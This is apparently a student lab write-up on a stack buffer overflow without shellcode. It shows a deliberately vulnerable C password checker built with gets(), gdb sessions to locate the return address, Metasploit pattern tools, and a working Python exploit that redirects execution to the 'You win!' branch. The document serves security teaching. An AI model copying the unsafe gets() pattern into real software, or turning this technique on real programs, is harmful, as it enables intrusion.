#### Proj 2: Linux Buffer Overflow Without Shellcode

```c
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2$ cat pwd.c
#include <stdio.h>

int test_pw()
{
        char pin[10];
        int x=15, i;
        printf("Enter password: ");
        gets(pin);
        for (i=0; i<10; i+=2) x = (x & pin[i]) | pin[i+1];
        if (x == 48) return 0;
        else return 1;
}

void main()
{
        if (test_pw()) printf("Fail!\n");
        else printf("You win!\n");
}
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2$ gcc -g --no-pie -std=gnu99 -Wall -Wl,--section-start=.text=0x08040000 -o pwd pwd.c -fno-stack-protector
pwd.c: In function ‘test_pw’:
pwd.c:8:9: warning: ‘gets’ is deprecated [-Wdeprecated-declarations]
         gets(pin);
         ^~~~
In file included from pwd.c:1:0:
/usr/include/stdio.h:640:14: note: declared here
 extern char *gets (char *__s) __wur __attribute_deprecated__;
              ^~~~
pwd.c: At top level:
pwd.c:14:6: warning: return type of ‘main’ is not ‘int’ [-Wmain]
 void main()
      ^~~~
/tmp/cc5Zv1j3.o: In function `test_pw':
/home/u32/cnit127/chapter-2/Proj-2/pwd.c:8: warning: the `gets' function is dangerous and should not be used.
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2$ ./pwd
Enter password: Testing
Fail!
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2$ ./pwd
Enter password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2$ gdb ./pwd -q
Reading symbols from ./pwd...done.
(gdb) disassemble main
Dump of assembler code for function main:
   0x08040174 <+0>:	lea    ecx,[esp+0x4]
   0x08040178 <+4>:	and    esp,0xfffffff0
   0x0804017b <+7>:	push   DWORD PTR [ecx-0x4]
   0x0804017e <+10>:	push   ebp
   0x0804017f <+11>:	mov    ebp,esp
   0x08040181 <+13>:	push   ecx
   0x08040182 <+14>:	sub    esp,0x4
   0x08040185 <+17>:	call   0x80400fb <test_pw>
   0x0804018a <+22>:	test   eax,eax
   0x0804018c <+24>:	je     0x80401a0 <main+44>
   0x0804018e <+26>:	sub    esp,0xc
   0x08040191 <+29>:	push   0x8040251
   0x08040196 <+34>:	call   0x8048360 <puts@plt>
   0x0804019b <+39>:	add    esp,0x10
   0x0804019e <+42>:	jmp    0x80401b0 <main+60>
   0x080401a0 <+44>:	sub    esp,0xc
   0x080401a3 <+47>:	push   0x8040257
   0x080401a8 <+52>:	call   0x8048360 <puts@plt>
   0x080401ad <+57>:	add    esp,0x10
   0x080401b0 <+60>:	nop
   0x080401b1 <+61>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x080401b4 <+64>:	leave
   0x080401b5 <+65>:	lea    esp,[ecx-0x4]
   0x080401b8 <+68>:	ret
End of assembler dump.
(gdb) disassemble test_pw
Dump of assembler code for function test_pw:
   0x080400fb <+0>:	push   ebp
   0x080400fc <+1>:	mov    ebp,esp
   0x080400fe <+3>:	sub    esp,0x28
   0x08040101 <+6>:	mov    DWORD PTR [ebp-0xc],0xf
   0x08040108 <+13>:	sub    esp,0xc
   0x0804010b <+16>:	push   0x8040240
   0x08040110 <+21>:	call   0x8048340 <printf@plt>
   0x08040115 <+26>:	add    esp,0x10
   0x08040118 <+29>:	sub    esp,0xc
   0x0804011b <+32>:	lea    eax,[ebp-0x1a]
   0x0804011e <+35>:	push   eax
   0x0804011f <+36>:	call   0x8048350 <gets@plt>
   0x08040124 <+41>:	add    esp,0x10
   0x08040127 <+44>:	mov    DWORD PTR [ebp-0x10],0x0
   0x0804012e <+51>:	jmp    0x804015a <test_pw+95>
   0x08040130 <+53>:	lea    edx,[ebp-0x1a]
   0x08040133 <+56>:	mov    eax,DWORD PTR [ebp-0x10]
   0x08040136 <+59>:	add    eax,edx
   0x08040138 <+61>:	movzx  eax,BYTE PTR [eax]
   0x0804013b <+64>:	movsx  eax,al
   0x0804013e <+67>:	and    eax,DWORD PTR [ebp-0xc]
   0x08040141 <+70>:	mov    edx,eax
   0x08040143 <+72>:	mov    eax,DWORD PTR [ebp-0x10]
   0x08040146 <+75>:	add    eax,0x1
   0x08040149 <+78>:	movzx  eax,BYTE PTR [ebp+eax*1-0x1a]
   0x0804014e <+83>:	movsx  eax,al
   0x08040151 <+86>:	or     eax,edx
   0x08040153 <+88>:	mov    DWORD PTR [ebp-0xc],eax
   0x08040156 <+91>:	add    DWORD PTR [ebp-0x10],0x2
   0x0804015a <+95>:	cmp    DWORD PTR [ebp-0x10],0x9
   0x0804015e <+99>:	jle    0x8040130 <test_pw+53>
   0x08040160 <+101>:	cmp    DWORD PTR [ebp-0xc],0x30
   0x08040164 <+105>:	jne    0x804016d <test_pw+114>
   0x08040166 <+107>:	mov    eax,0x0
   0x0804016b <+112>:	jmp    0x8040172 <test_pw+119>
   0x0804016d <+114>:	mov    eax,0x1
   0x08040172 <+119>:	leave
   0x08040173 <+120>:	ret
End of assembler dump.
(gdb) break *0x0804011f
Breakpoint 1 at 0x804011f: file pwd.c, line 8.
(gdb) break *0x08040172
Breakpoint 2 at 0x8040172: file pwd.c, line 12.
(gdb) run
Starting program: /home/u32/cnit127/chapter-2/Proj-2/pwd

Breakpoint 1, 0x0804011f in test_pw () at pwd.c:8
8	        gets(pin);
(gdb) x/20x $ebp
0xbffff5a8:	0xbffff5b8	0x0804018a	0xb7fb83dc	0xbffff5d0
0xbffff5b8:	0x00000000	0xb7e1a276	0x00000001	0xb7fb8000
0xbffff5c8:	0x00000000	0xb7e1a276	0x00000001	0xbffff664
0xbffff5d8:	0xbffff66c	0x00000000	0x00000000	0x00000000
0xbffff5e8:	0xb7fb8000	0xb7fffc04	0xb7fff000	0x00000000
(gdb) c
Continuing.
Enter password: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9

Breakpoint 2, test_pw () at pwd.c:12
12	}
(gdb) x/20x $ebp
0xbffff5a8:	0x39614138	0x41306241	0x62413162	0x33624132
0xbffff5b8:	0x41346241	0x62413562	0x37624136	0x41386241
0xbffff5c8:	0x00003962	0xb7e1a276	0x00000001	0xbffff664
0xbffff5d8:	0xbffff66c	0x00000000	0x00000000	0x00000000
0xbffff5e8:	0xb7fb8000	0xb7fffc04	0xb7fff000	0x00000000
(gdb) quit
A debugging session is active.

	Inferior 1 [process 6829] will be killed.

Quit anyway? (y or n) y
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2$
```

```sh
root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_create.rb -l 60
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9
root@kali:/usr/share/metasploit-framework/tools/exploit#
```

```sh
root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q 41306241
[*] Exact match at offset 30
root@kali:/usr/share/metasploit-framework/tools/exploit#
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2$ gdb ./pwd -q
Reading symbols from ./pwd...done.
(gdb) disassemble main
Dump of assembler code for function main:
   0x08040174 <+0>:	lea    ecx,[esp+0x4]
   0x08040178 <+4>:	and    esp,0xfffffff0
   0x0804017b <+7>:	push   DWORD PTR [ecx-0x4]
   0x0804017e <+10>:	push   ebp
   0x0804017f <+11>:	mov    ebp,esp
   0x08040181 <+13>:	push   ecx
   0x08040182 <+14>:	sub    esp,0x4
   0x08040185 <+17>:	call   0x80400fb <test_pw>
   0x0804018a <+22>:	test   eax,eax
   0x0804018c <+24>:	je     0x80401a0 <main+44>
   0x0804018e <+26>:	sub    esp,0xc
   0x08040191 <+29>:	push   0x8040251
   0x08040196 <+34>:	call   0x8048360 <puts@plt>
   0x0804019b <+39>:	add    esp,0x10
   0x0804019e <+42>:	jmp    0x80401b0 <main+60>
   0x080401a0 <+44>:	sub    esp,0xc
   0x080401a3 <+47>:	push   0x8040257
   0x080401a8 <+52>:	call   0x8048360 <puts@plt>
   0x080401ad <+57>:	add    esp,0x10
   0x080401b0 <+60>:	nop
   0x080401b1 <+61>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x080401b4 <+64>:	leave
   0x080401b5 <+65>:	lea    esp,[ecx-0x4]
   0x080401b8 <+68>:	ret
End of assembler dump.
(gdb) x/s 0x8040257
0x8040257:	"You win!"
(gdb) quit
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2$
```

```
   0x080401a0 <+44>:	sub    esp,0xc
   0x080401a3 <+47>:	push   0x8040257
   0x080401a8 <+52>:	call   0x8048360 <puts@plt>
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2$ cat pwd-e.py
#!/usr/bin/python

import sys
sys.stdout.write("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\x01\x04\x08")
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2$ ./pwd-e.py > pwd-exploit
```

```sh
00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000010: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 a0 40  AAAAAAAAAAAAAA.@
00000020: 04 08                                            ..
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2$ gdb ./pwd -q
Reading symbols from ./pwd...done.
(gdb) disassemble test_pw
Dump of assembler code for function test_pw:
   0x080400fb <+0>:	push   ebp
   0x080400fc <+1>:	mov    ebp,esp
   0x080400fe <+3>:	sub    esp,0x28
   0x08040101 <+6>:	mov    DWORD PTR [ebp-0xc],0xf
   0x08040108 <+13>:	sub    esp,0xc
   0x0804010b <+16>:	push   0x8040240
   0x08040110 <+21>:	call   0x8048340 <printf@plt>
   0x08040115 <+26>:	add    esp,0x10
   0x08040118 <+29>:	sub    esp,0xc
   0x0804011b <+32>:	lea    eax,[ebp-0x1a]
   0x0804011e <+35>:	push   eax
   0x0804011f <+36>:	call   0x8048350 <gets@plt>
   0x08040124 <+41>:	add    esp,0x10
   0x08040127 <+44>:	mov    DWORD PTR [ebp-0x10],0x0
   0x0804012e <+51>:	jmp    0x804015a <test_pw+95>
   0x08040130 <+53>:	lea    edx,[ebp-0x1a]
   0x08040133 <+56>:	mov    eax,DWORD PTR [ebp-0x10]
   0x08040136 <+59>:	add    eax,edx
   0x08040138 <+61>:	movzx  eax,BYTE PTR [eax]
   0x0804013b <+64>:	movsx  eax,al
   0x0804013e <+67>:	and    eax,DWORD PTR [ebp-0xc]
   0x08040141 <+70>:	mov    edx,eax
   0x08040143 <+72>:	mov    eax,DWORD PTR [ebp-0x10]
   0x08040146 <+75>:	add    eax,0x1
   0x08040149 <+78>:	movzx  eax,BYTE PTR [ebp+eax*1-0x1a]
   0x0804014e <+83>:	movsx  eax,al
   0x08040151 <+86>:	or     eax,edx
   0x08040153 <+88>:	mov    DWORD PTR [ebp-0xc],eax
   0x08040156 <+91>:	add    DWORD PTR [ebp-0x10],0x2
   0x0804015a <+95>:	cmp    DWORD PTR [ebp-0x10],0x9
   0x0804015e <+99>:	jle    0x8040130 <test_pw+53>
   0x08040160 <+101>:	cmp    DWORD PTR [ebp-0xc],0x30
   0x08040164 <+105>:	jne    0x804016d <test_pw+114>
   0x08040166 <+107>:	mov    eax,0x0
   0x0804016b <+112>:	jmp    0x8040172 <test_pw+119>
   0x0804016d <+114>:	mov    eax,0x1
   0x08040172 <+119>:	leave
   0x08040173 <+120>:	ret
End of assembler dump.
(gdb) break *0x0804011f
Breakpoint 1 at 0x804011f: file pwd.c, line 8.
(gdb) break *0x08040172
Breakpoint 2 at 0x8040172: file pwd.c, line 12.
(gdb) run --args < pwd-exploit
Starting program: /home/u32/cnit127/chapter-2/Proj-2/pwd --args < pwd-exploit

Breakpoint 1, 0x0804011f in test_pw () at pwd.c:8
8	        gets(pin);
(gdb) x/20x $ebp
0xbffff5a8:	0xbffff5b8	0x0804018a	0xb7fb83dc	0xbffff5d0
0xbffff5b8:	0x00000000	0xb7e1a276	0x00000002	0xb7fb8000
0xbffff5c8:	0x00000000	0xb7e1a276	0x00000002	0xbffff664
0xbffff5d8:	0xbffff670	0x00000000	0x00000000	0x00000000
0xbffff5e8:	0xb7fb8000	0xb7fffc04	0xb7fff000	0x00000000
(gdb) c
Continuing.

Breakpoint 2, test_pw () at pwd.c:12
12	}
(gdb) x/20x $ebp
0xbffff5a8:	0x41414141	0x080401a0	0xb7fb8300	0xbffff5d0
0xbffff5b8:	0x00000000	0xb7e1a276	0x00000002	0xb7fb8000
0xbffff5c8:	0x00000000	0xb7e1a276	0x00000002	0xbffff664
0xbffff5d8:	0xbffff670	0x00000000	0x00000000	0x00000000
0xbffff5e8:	0xb7fb8000	0xb7fffc04	0xb7fff000	0x00000000
(gdb) c
Continuing.
Enter password: You win!

Program received signal SIGSEGV, Segmentation fault.
0x080401b1 in main () at pwd.c:18
18	}
(gdb) quit
A debugging session is active.

	Inferior 1 [process 6906] will be killed.

Quit anyway? (y or n) y
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2$ ./pwd < pwd-exploit
Enter password: You win!
Segmentation fault (core dumped)
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2$
```